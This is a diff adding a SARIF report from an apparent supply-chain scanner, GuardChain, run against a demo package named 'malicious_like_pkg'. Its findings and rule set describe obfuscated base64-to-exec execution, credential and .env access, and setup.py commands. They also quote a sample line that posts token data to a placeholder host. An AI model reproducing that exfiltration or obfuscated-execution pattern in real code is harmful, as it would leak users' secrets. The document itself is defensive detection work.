@@ -1,0 +1,937 @@
+{
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "runs": [
+    {
+      "results": [
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "setup.py"
+                },
+                "region": {
+                  "startLine": 11
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Package depends on a known malicious/suspicious dependency"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": "bot-package",
+            "score": 60
+          },
+          "ruleId": "D001"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "malicious_like_pkg/payload.py"
+                },
+                "region": {
+                  "startColumn": 5,
+                  "startLine": 15
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Possible data exfiltration behavior detected"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "args_preview": [
+                "'https://example.invalid/demo'"
+              ],
+              "calls": [
+                "token",
+                "requests.post"
+              ],
+              "function": "demo_exfiltration_shape"
+            },
+            "score": 50
+          },
+          "ruleId": "B008"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "setup.py"
+                },
+                "region": {
+                  "startColumn": 1,
+                  "startLine": 5
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Dangerous top-level setup.py behavior"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "args_preview": [
+                "['python', '--version']"
+              ],
+              "call": "subprocess.run"
+            },
+            "score": 50
+          },
+          "ruleId": "S001"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "malicious_like_pkg/payload.py"
+                },
+                "region": {
+                  "startColumn": 5,
+                  "startLine": 9
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Obfuscation source flows into dynamic execution"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "flow": [
+                "base64.b64decode",
+                "decoded",
+                "exec"
+              ],
+              "function": "demo_obfuscated_execution",
+              "sink": "exec",
+              "sink_preview": "exec(decoded)",
+              "source": "base64.b64decode",
+              "variable": "decoded"
+            },
+            "score": 50
+          },
+          "ruleId": "T004"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "setup.py"
+                },
+                "region": {
+                  "startColumn": 1,
+                  "startLine": 5
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "System command execution detected in setup.py"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "args_preview": [
+                "['python', '--version']"
+              ],
+              "calls": [
+                "subprocess.run"
+              ],
+              "function": "<module>"
+            },
+            "score": 45
+          },
+          "ruleId": "B002"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "malicious_like_pkg/payload.py"
+                },
+                "region": {
+                  "startColumn": 5,
+                  "startLine": 8
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Encoded or obfuscated content may be dynamically executed"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "args_preview": [
+                "encoded",
+                "decoded"
+              ],
+              "calls": [
+                "base64.b64decode",
+                "exec"
+              ],
+              "function": "demo_obfuscated_execution"
+            },
+            "score": 45
+          },
+          "ruleId": "B006"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "setup.py"
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "setup.py contains suspicious executable logic"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": "subprocess",
+            "score": 30
+          },
+          "ruleId": "M004"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "malicious_like_pkg/payload.py"
+                },
+                "region": {
+                  "startColumn": 5,
+                  "startLine": 17
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Sensitive source flows into network sink"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "flow": [
+                "token_path",
+                "demo_data",
+                "requests.post"
+              ],
+              "function": "demo_exfiltration_shape",
+              "sink": "requests.post",
+              "sink_preview": "requests.post('https://example.invalid/demo', json=demo_data, timeout=1)",
+              "source": "token_path",
+              "variable": "demo_data"
+            },
+            "score": 30
+          },
+          "ruleId": "T001"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "malicious_like_pkg/payload.py"
+                },
+                "region": {
+                  "startColumn": 5,
+                  "startLine": 17
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Local file secret flows into network sink"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "flow": [
+                "token_path",
+                "demo_data",
+                "requests.post"
+              ],
+              "function": "demo_exfiltration_shape",
+              "sink": "requests.post",
+              "sink_preview": "requests.post('https://example.invalid/demo', json=demo_data, timeout=1)",
+              "source": "token_path",
+              "variable": "demo_data"
+            },
+            "score": 30
+          },
+          "ruleId": "T005"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "malicious_like_pkg/payload.py"
+                },
+                "region": {
+                  "startColumn": 5,
+                  "startLine": 9
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Dynamic code execution detected"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "args_preview": [
+                "decoded"
+              ],
+              "calls": [
+                "exec"
+              ],
+              "function": "demo_obfuscated_execution"
+            },
+            "score": 25
+          },
+          "ruleId": "B001"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "malicious_like_pkg/payload.py"
+                },
+                "region": {
+                  "startColumn": 9,
+                  "startLine": 14
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Sensitive environment or credential access detected"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "args_preview": [],
+              "calls": [
+                "token",
+                "os.environ",
+                ".env"
+              ],
+              "function": "demo_exfiltration_shape"
+            },
+            "score": 25
+          },
+          "ruleId": "B004"
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "malicious_like_pkg/payload.py"
+                },
+                "region": {
+                  "startColumn": 5,
+                  "startLine": 17
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Network operation detected"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "args_preview": [
+                "'https://example.invalid/demo'"
+              ],
+              "calls": [
+                "requests.post"
+              ],
+              "function": "demo_exfiltration_shape"
+            },
+            "score": 15
+          },
+          "ruleId": "B003"
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "malicious_like_pkg/payload.py"
+                },
+                "region": {
+                  "startColumn": 15,
+                  "startLine": 8
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Obfuscation or encoded payload handling detected"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "args_preview": [
+                "encoded"
+              ],
+              "calls": [
+                "base64.b64decode"
+              ],
+              "function": "demo_obfuscated_execution"
+            },
+            "score": 15
+          },
+          "ruleId": "B005"
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "setup.py"
+                },
+                "region": {
+                  "startLine": 11
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Dependency name contains words commonly used in suspicious demo payloads"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": "bot-package",
+            "score": 15
+          },
+          "ruleId": "D009"
+        },
+        {
+          "level": "note",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "malicious_like_pkg/payload.py"
+                },
+                "region": {
+                  "startColumn": 1,
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Suspicious module imported"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "args_preview": [],
+              "calls": [
+                "base64",
+                "requests"
+              ],
+              "function": "<module>"
+            },
+            "score": 5
+          },
+          "ruleId": "B009"
+        },
+        {
+          "level": "note",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "setup.py"
+                },
+                "region": {
+                  "startColumn": 1,
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Suspicious module imported"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": {
+              "args_preview": [],
+              "calls": [
+                "subprocess"
+              ],
+              "function": "<module>"
+            },
+            "score": 5
+          },
+          "ruleId": "B009"
+        },
+        {
+          "level": "note",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "setup.py"
+                },
+                "region": {
+                  "startLine": 11
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Unpinned dependency version"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": "requests",
+            "score": 5
+          },
+          "ruleId": "D004"
+        },
+        {
+          "level": "note",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "setup.py"
+                },
+                "region": {
+                  "startLine": 11
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Unpinned dependency version"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": "bot-package",
+            "score": 5
+          },
+          "ruleId": "D004"
+        },
+        {
+          "level": "note",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".\\samples\\malicious_like_pkg"
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Package has no repository or homepage URL"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": null,
+            "score": 5
+          },
+          "ruleId": "M001"
+        },
+        {
+          "level": "note",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".\\samples\\malicious_like_pkg"
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Package description is too short"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": "<missing>",
+            "score": 5
+          },
+          "ruleId": "M002"
+        },
+        {
+          "level": "note",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".\\samples\\malicious_like_pkg"
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Package metadata is missing author or contact information"
+          },
+          "properties": {
+            "confidence": 1.0,
+            "evidence": null,
+            "score": 5
+          },
+          "ruleId": "M007"
+        }
+      ],
+      "tool": {
+        "driver": {
+          "informationUri": "https://github.com/guardchain/guardchain",
+          "name": "GuardChain",
+          "rules": [
+            {
+              "fullDescription": {
+                "text": "Package depends on a known malicious/suspicious dependency"
+              },
+              "id": "D001",
+              "name": "Known malicious dependency",
+              "properties": {
+                "category": "dependency",
+                "confidence": 1.0,
+                "severity": "critical",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Known malicious dependency"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Possible data exfiltration behavior detected"
+              },
+              "id": "B008",
+              "name": "Possible exfiltration pattern",
+              "properties": {
+                "category": "behavior",
+                "confidence": 1.0,
+                "severity": "critical",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Possible exfiltration pattern"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Dangerous top-level setup.py behavior"
+              },
+              "id": "S001",
+              "name": "Dangerous top-level setup.py behavior",
+              "properties": {
+                "category": "setup",
+                "confidence": 1.0,
+                "severity": "critical",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Dangerous top-level setup.py behavior"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Obfuscation source flows into dynamic execution"
+              },
+              "id": "T004",
+              "name": "Obfuscation source flows into dynamic execution",
+              "properties": {
+                "category": "taint",
+                "confidence": 1.0,
+                "severity": "critical",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Obfuscation source flows into dynamic execution"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "System command execution detected in setup.py"
+              },
+              "id": "B002",
+              "name": "System command execution",
+              "properties": {
+                "category": "behavior",
+                "confidence": 1.0,
+                "severity": "critical",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "System command execution"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Encoded or obfuscated content may be dynamically executed"
+              },
+              "id": "B006",
+              "name": "Obfuscated execution pattern",
+              "properties": {
+                "category": "behavior",
+                "confidence": 1.0,
+                "severity": "critical",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Obfuscated execution pattern"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "setup.py contains suspicious executable logic"
+              },
+              "id": "M004",
+              "name": "Suspicious setup.py content",
+              "properties": {
+                "category": "metadata",
+                "confidence": 1.0,
+                "severity": "high",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Suspicious setup.py content"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Sensitive source flows into network sink"
+              },
+              "id": "T001",
+              "name": "Sensitive source flows into network sink",
+              "properties": {
+                "category": "taint",
+                "confidence": 1.0,
+                "severity": "high",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Sensitive source flows into network sink"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Local file secret flows into network sink"
+              },
+              "id": "T005",
+              "name": "Local file secret flows into network sink",
+              "properties": {
+                "category": "taint",
+                "confidence": 1.0,
+                "severity": "high",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Local file secret flows into network sink"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Dynamic code execution detected"
+              },
+              "id": "B001",
+              "name": "Dynamic code execution",
+              "properties": {
+                "category": "behavior",
+                "confidence": 1.0,
+                "severity": "high",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Dynamic code execution"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Sensitive environment or credential access detected"
+              },
+              "id": "B004",
+              "name": "Sensitive environment access",
+              "properties": {
+                "category": "behavior",
+                "confidence": 1.0,
+                "severity": "high",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Sensitive environment access"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Network operation detected"
+              },
+              "id": "B003",
+              "name": "Network communication",
+              "properties": {
+                "category": "behavior",
+                "confidence": 1.0,
+                "severity": "medium",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Network communication"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Obfuscation or encoded payload handling detected"
+              },
+              "id": "B005",
+              "name": "Obfuscation or encoding",
+              "properties": {
+                "category": "behavior",
+                "confidence": 1.0,
+                "severity": "medium",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Obfuscation or encoding"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Dependency name contains words commonly used in suspicious demo payloads"
+              },
+              "id": "D009",
+              "name": "Suspicious dependency name pattern",
+              "properties": {
+                "category": "dependency",
+                "confidence": 1.0,
+                "severity": "medium",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Suspicious dependency name pattern"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Suspicious module imported"
+              },
+              "id": "B009",
+              "name": "Suspicious import",
+              "properties": {
+                "category": "behavior",
+                "confidence": 1.0,
+                "severity": "low",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Suspicious import"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Unpinned dependency version"
+              },
+              "id": "D004",
+              "name": "Unpinned dependency",
+              "properties": {
+                "category": "dependency",
+                "confidence": 1.0,
+                "severity": "low",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Unpinned dependency"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Package has no repository or homepage URL"
+              },
+              "id": "M001",
+              "name": "Missing repository URL",
+              "properties": {
+                "category": "metadata",
+                "confidence": 1.0,
+                "severity": "low",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Missing repository URL"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Package description is too short"
+              },
+              "id": "M002",
+              "name": "Very short description",
+              "properties": {
+                "category": "metadata",
+                "confidence": 1.0,
+                "severity": "low",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Very short description"
+              }
+            },
+            {
+              "fullDescription": {
+                "text": "Package metadata is missing author or contact information"
+              },
+              "id": "M007",
+              "name": "Missing author contact",
+              "properties": {
+                "category": "metadata",
+                "confidence": 1.0,
+                "severity": "low",
+                "tags": []
+              },
+              "shortDescription": {
+                "text": "Missing author contact"
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "version": "2.1.0"
+}
